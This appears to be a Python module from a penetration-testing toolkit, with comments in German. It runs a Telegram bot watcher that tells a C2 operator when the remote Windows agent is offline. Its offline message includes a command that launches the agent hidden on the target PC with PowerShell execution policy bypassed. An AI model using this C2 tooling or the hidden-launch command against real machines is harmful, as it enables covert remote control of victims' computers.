"""
C2 Watcher — Offline-Detektor für den Telegram C2 Agenten.

Läuft auf Kali wenn der Agent NICHT aktiv ist. Wenn der Operator dem Bot
schreibt und kein Agent antwortet, schickt der Watcher automatisch eine
"Agent offline" Nachricht zurück — mit letzter bekannter Aktivität.

Architektur:
  Operator schreibt Bot → Bot hat keine Antwort (Agent tot)
  → Watcher sieht pending Update → sendet Offline-Notice
"""
from __future__ import annotations
import asyncio
import json
import os
import time
import urllib.request
import urllib.parse
import urllib.error
from datetime import datetime
from typing import AsyncGenerator

from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp

HELP = ToolHelp(
    name="C2 Watcher",
    description=(
        "Läuft auf Kali als Fallback wenn der Windows-Agent offline ist. "
        "Antwortet automatisch mit 'Agent offline' wenn der Bot angeschrieben wird."
    ),
    usage="Starten wenn Agent nicht aktiv ist. Stoppt mit Ctrl+C.",
    danger_note="🔴 RED — nur für eigene/autorisierte Geräte.",
    example="Starte Watcher → Agent offline → Operator schreibt → bekommt Offline-Nachricht",
)

DANGER = DangerLevel.RED

_LAST_SEEN_FILE = "/tmp/penkit_c2_last_seen"


def mark_agent_generated():
    """Schreibt Timestamp wenn Agent generiert wird — Watcher liest das später."""
    try:
        with open(_LAST_SEEN_FILE, "w") as f:
            f.write(str(time.time()))
    except Exception:
        pass


def _get_last_seen() -> str:
    """Gibt an wann der Agent zuletzt generiert wurde."""
    try:
        if os.path.exists(_LAST_SEEN_FILE):
            t = float(open(_LAST_SEEN_FILE).read().strip())
            diff = int(time.time() - t)
            if diff < 60:
                return f"vor {diff}s"
            elif diff < 3600:
                return f"vor {diff // 60} min"
            elif diff < 86400:
                return f"vor {diff // 3600} Std"
            else:
                return datetime.fromtimestamp(t).strftime("%d.%m.%Y %H:%M")
    except Exception:
        pass
    return "unbekannt"


class C2Watcher:
    def __init__(self, token: str, chat_id: str):
        self.token    = token
        self.chat_id  = chat_id
        self.api      = f"https://api.telegram.org/bot{token}"
        self.offset   = 0
        self._running = True

    def _api_call(self, method: str, params: dict | None = None) -> dict:
        url = f"{self.api}/{method}"
        if params:
            url += "?" + urllib.parse.urlencode(params)
        try:
            with urllib.request.urlopen(url, timeout=12) as r:
                return json.loads(r.read())
        except Exception:
            return {}

    def _api_post(self, method: str, data: dict) -> dict:
        payload = urllib.parse.urlencode(data).encode()
        try:
            req = urllib.request.Request(f"{self.api}/{method}", data=payload)
            with urllib.request.urlopen(req, timeout=10) as r:
                return json.loads(r.read())
        except Exception:
            return {}

    def _get_updates(self, timeout: int = 5) -> list[dict]:
        r = self._api_call("getUpdates", {"offset": self.offset, "timeout": timeout, "limit": 5})
        return r.get("result", [])

    def _send(self, text: str):
        self._api_post("sendMessage", {
            "chat_id":    self.chat_id,
            "text":       text,
            "parse_mode": "HTML",
        })

    def _send_offline_notice(self, operator_msg: str, last_seen: str):
        ts = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
        msg = (
            f"⚠️ <b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
            f"    💀 <b>PENKIT C2 — AGENT OFFLINE</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
            f"🔴 <b>Status:</b>   Agent antwortet nicht\n"
            f"📝 <b>Dein Befehl:</b> <code>{operator_msg[:80]}</code>\n"
            f"🕐 <b>Zuletzt aktiv:</b> <code>{last_seen}</code>\n"
            f"⏰ <b>Zeit:</b>     <code>{ts}</code>\n\n"
            f"<i>Starte den Agent auf dem Ziel-PC:</i>\n"
            f"<code>powershell -ep bypass -w hidden -File agent.ps1</code>\n\n"
            f"💡 <b>Sobald der Agent startet, bekommst du eine Boot-Nachricht.</b>"
        )
        self._send(msg)

    def _send_online_notice(self):
        ts = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
        msg = (
            f"✅ <b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
            f"   🟢 <b>C2 WATCHER — AKTIV</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
            f"🔍 Überwache Bot auf Offline-Nachrichten.\n"
            f"⏰ Gestartet: <code>{ts}</code>\n\n"
            f"<i>Wenn der Agent nicht antwortet, bekommst du hier eine Benachrichtigung.</i>"
        )
        self._send(msg)

    async def start(self) -> AsyncGenerator[str, None]:
        yield "[*] C2 Watcher startet..."

        # Skip all OLD messages so wir nicht auf alte Chats antworten
        yield "[*] Überspringe alte Nachrichten..."
        old = self._get_updates(timeout=0)
        if old:
            self.offset = old[-1]["update_id"] + 1
            yield f"[*] {len(old)} alte Nachricht(en) übersprungen (Offset: {self.offset})"
        else:
            yield "[*] Keine alten Nachrichten."

        last_seen = _get_last_seen()
        yield f"[+] Agent zuletzt generiert: {last_seen}"
        yield f"[+] Watcher aktiv — warte auf Nachrichten..."
        yield f"[*] Ctrl+C zum Stoppen\n"

        # Inform operator
        self._send_online_notice()

        msg_count  = 0
        check_count = 0

        try:
            while self._running:
                updates = self._get_updates(timeout=5)
                check_count += 1

                for u in updates:
                    self.offset = u["update_id"] + 1

                    # Nur Textnachrichten vom Operator beachten
                    text = u.get("message", {}).get("text", "")
                    if not text:
                        continue

                    ts_str = datetime.now().strftime("%H:%M:%S")
                    yield f"  [{ts_str}] Operator: {text[:60]}"

                    last_seen = _get_last_seen()
                    self._send_offline_notice(text, last_seen)
                    msg_count += 1
                    yield f"  [{ts_str}] Offline-Notice gesendet (#{msg_count})"

                # Status alle 60 Checks (= ~5 min)
                if check_count % 60 == 0:
                    ts_str = datetime.now().strftime("%H:%M:%S")
                    yield f"  [{ts_str}] Watcher läuft... ({msg_count} Offline-Notices gesendet)"

                await asyncio.sleep(1)

        except asyncio.CancelledError:
            pass

        yield f"\n[*] Watcher gestoppt. {msg_count} Offline-Notices gesendet."

    def stop(self):
        self._running = False
